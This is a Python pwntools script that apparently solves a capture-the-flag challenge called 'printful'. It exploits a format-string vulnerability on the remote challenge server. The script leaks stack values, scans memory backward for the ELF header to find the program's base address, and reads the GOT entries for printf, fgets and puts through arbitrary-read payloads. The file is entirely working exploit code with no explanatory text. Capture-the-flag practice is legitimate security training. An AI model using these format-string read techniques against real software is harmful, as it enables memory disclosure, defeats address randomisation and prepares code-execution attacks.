import struct

from pwn import *

chal = remote("printful.challs.pwnoh.io", 1337, ssl=True)


def wait_til_prompt():
    return chal.recvuntil(b"> ")


def dump_address(address, format="p"):
    leak_part = f"|%24${format}|EOF_prnt".encode()
    out = leak_part.ljust(136, b"A") + b"EOF_prnt" + struct.pack("Q", address)
    chal.sendline(out)

    return chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")].split(b"|")[1]


def leak_position(position, format="p"):
    chal.sendline(f"%{position}${format}EOF_prnt".encode())
    return chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")]


def get_image_base_address():
    page_aligned_image_leak = int(leak_position(34), 16) & ~0xFFF

    while True:
        wait_til_prompt()
        if b"ELF" in dump_address(page_aligned_image_leak, "s"):
            break
        page_aligned_image_leak -= 0x1000

    return page_aligned_image_leak


wait_til_prompt()
image_base_address = get_image_base_address()

wait_til_prompt()
PRINTF_GOT = struct.unpack(
    "Q", dump_address(image_base_address + 0x3FB8, "s").ljust(8, b"\x00")
)[0]

wait_til_prompt()
FGETS_GOT = struct.unpack(
    "Q", dump_address(image_base_address + 0x3FC0, "s").ljust(8, b"\x00")
)[0]

wait_til_prompt()
PUTS_GOT = struct.unpack(
    "Q", dump_address(image_base_address + 0x3FA8, "s").ljust(8, b"\x00")
)[0]

print(hex(PRINTF_GOT))
print(hex(FGETS_GOT))
print(hex(PUTS_GOT))
